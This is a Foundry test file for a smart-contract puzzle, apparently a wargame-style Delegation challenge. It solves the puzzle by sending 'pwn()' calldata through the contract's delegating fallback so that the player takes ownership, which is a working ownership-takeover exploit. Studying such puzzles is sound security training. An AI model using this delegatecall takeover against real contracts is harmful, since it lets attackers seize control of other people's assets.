// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/puzzles/6/Delegate.sol";


contract DelegateTest is Test {
    Delegate internal delegateContract;
    Delegation internal puzzleContract;

    address owner = makeAddr("owner");
    address player = makeAddr("player");

    function setUp() public {
        vm.startPrank(owner);
        delegateContract = new Delegate(owner);
        puzzleContract = new Delegation(address(delegateContract));
        vm.stopPrank();
    }

    function testSolveDelegate() public {
        bytes memory data = abi.encodeWithSignature("pwn()");
        vm.startPrank(player);
        (bool success, ) = address(puzzleContract).call(data);
        assertEq(success, true);
        assertEq(puzzleContract.owner(), player);
        vm.stopPrank();
    }

}